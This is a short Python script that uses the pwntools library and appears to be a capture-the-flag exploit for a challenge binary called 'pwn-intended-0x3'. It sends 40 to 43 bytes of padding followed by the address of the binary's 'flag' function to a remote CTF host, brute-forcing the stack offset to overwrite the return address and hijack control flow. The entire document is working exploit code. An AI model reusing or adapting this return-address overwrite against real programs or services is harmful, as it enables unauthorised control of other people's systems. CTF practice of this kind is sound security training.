from pwn import *
binary = ELF('./pwn-intended-0x3')

for i in range(40 , 44):
    payload = i *b'a'
    flag = binary.symbols['flag']
    payload += p64(flag)
    
    p = remote('chall.csivit.com', 30013)
    print(p.recvline())
    p.sendline(payload)
    try:
        print(p.recvline())
        print(p.recvuntil('}'))
        print(i)
        break
    except:
        continue
